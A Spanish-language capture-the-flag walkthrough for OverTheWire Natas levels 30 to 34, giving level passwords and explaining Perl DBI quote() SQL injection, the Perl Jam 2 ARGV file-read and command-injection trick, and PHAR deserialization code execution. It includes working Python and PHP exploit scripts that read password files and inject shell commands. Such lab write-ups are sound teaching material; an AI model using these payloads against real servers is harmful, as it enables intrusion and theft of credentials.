# Nivel 30-34

### NIVEL 30

Ingresamos las credenciales para el nivel 30.

* **Usuario:** `natas30`
* **Contraseña:** `WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 30**. Se nos muestra en la página para hacer **Login** con nuestro usuario y contraseña por lo que revisamos el código fuente.

<figure><img src="../../../.gitbook/assets/image (404).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (405).png" alt=""><figcaption></figcaption></figure>

Este código Perl verifica si el método de solicitud es "POST" y si se proporcionan un nombre de usuario y una contraseña. Si es así, establece una conexión a la base de datos, forma una consulta usando `$dbh->quote(param())`, y la ejecuta. Si hay un resultado, se imprime; de lo contrario, se muestra "fail :(".

Aunque la inyección SQL parece una posible vulnerabilidad, intentos comunes como `' OR 1=1 --` no funcionan. Será necesario explorar otras posibles fallos.

Como `$dbh->quote(param())` es el encargado de interpretar nuestra entrada y agregarla a la consulta, pensé que debería revisarlo primero. Si existe alguna vulnerabilidad en este punto, sería suficiente para inyectar una cadena maliciosa en la consulta SQL.

Busqué "perl sql injection" y encontré un resultado que apareció entre los primeros. Puedes consultar la discusión completa sobre la vulnerabilidad en conexiones de bases de datos en Perl en la siguiente página de Stack Exchange: [Is this Perl database connection vulnerable to SQL injection?](https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection/175872#175872)

En el código fuente, se espera un nombre de usuario y una contraseña, pero no se restringe a que solo se proporcione un valor para cada uno. Esto significa que podríamos enviar varios valores, lo que convertiría uno de los parámetros en un array.

Además, si `quote()` se llama con una lista de valores y el segundo es un entero, `quote()` podría devolver un valor sin comillas. Es decir, al proporcionar un array, se podría invocar la segunda definición de `quote()` en lugar de la primera, que es la que se esperaba usar.

```perl
$sql = $dbh->quote($value);
$sql = $dbh->quote($value, $data_type);
```

El código que proporcionamos realiza una solicitud HTTP POST autenticada a un sitio web, pasando datos específicos como parámetros. Usamos una sesión de `requests` para gestionar la autenticación básica y enviamos un conjunto de parámetros a la URL especificada. Luego, imprimimos la respuesta del servidor.

```python
import requests

# Crear una función para manejar la solicitud
def make_request(username, password):
    # Crear una sesión
    with requests.Session() as session:
        # Configurar la autenticación básica
        session.auth = ('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')
        
        # Definir la URL
        url = "http://natas30.natas.labs.overthewire.org/index.pl"
        
        # Configurar los parámetros de la solicitud
        data = {
            "username": username,
            "password": ["'lol' or 1", 4]
        }
        
        # Realizar la solicitud POST
        response = session.post(url, data=data, verify=False)
        
        return response.text

# Llamar a la función con los parámetros necesarios
response_text = make_request("natas28", "'lol' or 1")
print(response_text)
```

<figure><img src="../../../.gitbook/assets/image (406).png" alt=""><figcaption></figcaption></figure>

### NIVEL 31

Ingresamos las credenciales para el nivel 31.

* **Usuario:** `natas31`
* **Contraseña:** `m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 31**. Se nos muestra para subir archivos .csv por lo que revisamos el código fuente.

<figure><img src="../../../.gitbook/assets/image (407).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (408).png" alt=""><figcaption></figcaption></figure>

Inicialmente, pensé en un ataque de inyección CSV, donde se usan valores que comienzan con `=` y otros operadores, los cuales se evalúan cuando se abre el archivo. Investigé sobre estos ataques y probé varios payloads, pero no tuve éxito. Esto probablemente se debe a que el archivo CSV no se está abriendo de la manera necesaria (no se evalúa nada, solo se abre como un archivo de texto).

También intenté subir otros tipos de archivos, ya que tenemos capacidades para cargar archivos, pero no obtuve resultados. Del mismo modo, el archivo subido no se procesa como algo ejecutable.

#### The Pinnacle (Perl Jam 2)

La vulnerabilidad real se encuentra en las llamadas a las funciones `$cgi->`.

Encontrar documentación sobre estas funciones antiguas de Perl fue bastante complicado. La vulnerabilidad en cuestión se describe en una charla titulada "Perl Jam 2", presentada por Netanel Rubin en CCC en 2016, entre otras conferencias.&#x20;

Ahora que hemos cubierto cómo funciona en teoría, probemos en la práctica. Utilicé la edición gratuita de Burp Suite para esto. Si no has usado Burp antes, tengo una publicación en el blog que describe cómo configurarlo.

Con Burp abierto y el tráfico de tu navegador siendo proxyado a través de Burp, visita [http://natas31.natas.labs.overthewire.org/](http://natas31.natas.labs.overthewire.org/) y sube un archivo CSV. El contenido del archivo no es relevante.

En la pestaña Proxy > History, haz clic derecho en la solicitud y selecciona "Send to Repeater".

<figure><img src="../../../.gitbook/assets/image (409).png" alt=""><figcaption></figcaption></figure>

Necesitarás hacer dos modificaciones. Primero, copia y pega uno de los bloques de `form-data` antes de los datos del CSV, utilizando `Content-Disposition: form-data; name="file"` seguido de `ARGV`. Asegúrate de que los datos del límite (`boundary`) coincidan con los de los otros bloques.

Esto sirve para introducir datos adicionales antes del archivo real, de manera que Perl capture el primer descriptor de archivo y su valor como `ARGV`.

En segundo lugar, debemos proporcionar un valor para `ARGV` (el archivo que queremos abrir). Esto se logra añadiendo `?filename` al final de la URL. Como queremos acceder a `/etc/natas_webpass/natas32`, usaremos un `?` seguido de ese valor.

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-08-21 112545.png" alt=""><figcaption></figcaption></figure>

### NIVEL 32

Ingresamos las credenciales para el nivel 32.

* **Usuario:** `natas32`
* **Contraseña:**`NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 32**. Se nos muestra para subir archivos .csv por lo que revisamos el código fuente. Parecido al nivel anterior.

<figure><img src="../../../.gitbook/assets/image (410).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (411).png" alt=""><figcaption></figcaption></figure>

El código no tiene mucha diferencia relevante del anterior por lo que he creado este script para obtener la contraseña teniendo en cuenta más o menos como la obtuvimos anteriormente.

```python
import requests
import re

# Credenciales para el nivel 32
credentials = {
    'username': 'natas32',
    'password': 'NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B'
}

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

# La URL a la que se enviará la solicitud POST
url = base_url + '?/var/www/natas/natas32/getpassword | xargs echo|'

# Crea una sesión de requests
session = requests.session()

# Los datos y archivos que se enviarán en la solicitud POST
data = {'file': 'ARGV'}
files = [('file', ('my_csv.csv', b'a,b\n1,2'))]

# Envía la solicitud POST
response = session.post(url, data=data, files=files, auth=auth)

# Utiliza una expresión regular para extraer la contraseña de la respuesta
password_regex = re.compile(r'<th>(.+)\n</th>')
next_password = password_regex.findall(response.content.decode('utf-8'))[0]
print(next_password)

# Función para guardar credenciales 
def save_credentials(level, password):
    print(f"Credenciales para el nivel {level} guardadas: {password}")

# Guarda las credenciales para el siguiente nivel
save_credentials(33, next_password)
```

Este script realiza lo siguiente:

1. **Configura las Credenciales**: Utiliza el nombre de usuario y la contraseña para el nivel 32 de Natas.
2. **Envía una Solicitud POST**: Envía una solicitud POST al servidor, incluyendo un archivo CSV con un payload y datos adicionales que engañan al servidor para ejecutar un comando.
3. **Extrae la Contraseña**: Analiza la respuesta del servidor para encontrar la contraseña del siguiente nivel usando una expresión regular.
4. **Guarda las Credenciales**: Simula el almacenamiento de las credenciales del siguiente nivel (nivel 33).

<figure><img src="../../../.gitbook/assets/image (412).png" alt=""><figcaption></figcaption></figure>

### NIVEL 33

Ingresamos las credenciales para el nivel 33.

* **Usuario:** `natas33`
* **Contraseña:** `2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 33**. Se nos muestra para subir un Firmware.

<figure><img src="../../../.gitbook/assets/image (413).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (414).png" alt=""><figcaption></figcaption></figure>

El código fuente define una clase llamada `Executor()` que se activa cuando se carga un archivo:

1. **Verificación del Archivo**:
   * La clase `Executor` obtiene el nombre del archivo de la solicitud POST.
   * Verifica si el tamaño del archivo supera el límite permitido de 4096 bytes.
2. **Moviendo el Archivo**:
   * Mueve el archivo cargado al directorio de subidas utilizando el nombre del archivo, que coincide con el `PHPSESSID`.
3. **Verificación al Destruir**:
   * En la función `__destruct()`, se asegura de que el directorio actual sea el directorio de subidas.
4. **Problema Principal**:
   * Si el valor resultante de `md5_file()` del archivo coincide con el valor de `$signature`, el archivo se ejecutará.
   * Si no coincide, el sistema reportará un fallo y no podremos continuar.

Con esta información, podemos comenzar a idear soluciones para este desafío. Para ello cree este script.

El código PHP proporcionado crea un archivo PHAR (PHP Archive) que contiene objetos PHP serializados. Aquí tienes una breve descripción de lo que hace cada parte:

1. **Clase PHARFile**: Define una clase con dos propiedades públicas, `$filename` y `$signature`. El constructor inicializa estas propiedades.
2. **Creación de una Instancia**: Se crea una instancia de `PHARFile` con `{{0}}` y `{{1}}` como marcadores de posición para `$filename` y `$signature`.
3. **Creación del Archivo PHAR**: Se crea un nuevo archivo PHAR llamado `test.phar`. La instancia de la clase se serializa y se añade al archivo PHAR como `test.txt`.
4. **Salida**: El script muestra un mensaje confirmando que se ha creado el archivo PHAR.

```php
<?php

// Usa una clase PHAR simple
class PHARFile {
    public $filename;
    public $signature;

    public function __construct($filename, $signature) {
        $this->filename = $filename;
        $this->signature = $signature;
    }
}

// Crea una instancia de la clase
$pharFile = new PHARFile('{{0}}', '{{1}}');

// Serialízalo
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', serialize($pharFile));
$phar->stopBuffering();

// Muestra el mensaje de creación del archivo PHAR
echo "PHAR file created: test.phar";
?>
```

Este código está diseñado para explotar la vulnerabilidad de este nivel que permite la carga y ejecución de archivos PHP.&#x20;

1. **Configuración inicial**:
   * Se definen las credenciales y la URL del objetivo.
   * Se crea un archivo PHP que leerá la contraseña de la siguiente etapa.
2. **Generación y escritura del archivo PHP**:
   * Se crea un contenido PHP que lee un archivo sensible (en este caso, `/etc/natas_webpass/natas34`).
   * Se calcula el hash MD5 del contenido PHP para verificar la integridad del archivo.
   * Se lee una plantilla de archivo PHP, se reemplazan los valores de los placeholders con el nombre del archivo y el hash calculado, y se escribe el archivo resultante.
3. **Ejecución del archivo PHP**:
   * Se ejecuta el archivo PHP generado para asegurar que el atributo `phar.readonly` no esté activado.
4. **Carga del archivo PHP malicioso**:
   * Se realiza una solicitud POST para cargar el archivo PHP malicioso en el servidor.
5. **Carga del archivo PHAR**:
   * Se crea un archivo PHAR (un archivo comprimido con código PHP) y se sube al servidor. El archivo PHAR está diseñado para ejecutar código PHP arbitrario.

```python
import requests
import hashlib
import subprocess

level = 'natas33'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

# Hardcoded credentials
auth = (level, '2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ')

content = b'<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>'
content_hash = hashlib.md5(content).hexdigest()
filename = 'rce.php'

# Read the template file
with open('natas33.php.template', 'r') as template:
    template_content = template.read()

# Replace placeholders with actual values
template_content = template_content.replace('{0}', filename).replace('{1}', content_hash)

# Write the updated content to natas33.php
with open('natas33.php', 'w') as o:
    o.write(template_content)

# phar.readonly attribute is usually activated, to avoid exactly what we are trying to do ;)
output = subprocess.check_output(['php', '-d', 'phar.readonly=false', 'natas33.php'])

# Upload your rce script and overwrite the filename field to have the file accessible for the next step.
requests.post(url + '/index.php', auth=auth,
              data={'filename': filename, 'submit': 'Upload File'},
              files={'uploadedfile': content})

# Now the tricky part: upload the generated phar file but instead of giving a file name, use the protocol handler.
response = requests.post(url + '/index.php', auth=auth, data={'filename': 'phar://test.phar/test.txt', 'submit': 'Upload File'}, files={'uploadedfile': open('test.phar', 'rb')})
print(response.text)
```

<figure><img src="../../../.gitbook/assets/image (417).png" alt=""><figcaption></figcaption></figure>

### NIVEL 34

Ingresamos las credenciales para el nivel 34.

* **Usuario:** `natas34`
* **Contraseña:** `j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 34**. Finalizamos de momento todos los niveles.

<figure><img src="../../../.gitbook/assets/image (416).png" alt=""><figcaption></figcaption></figure>
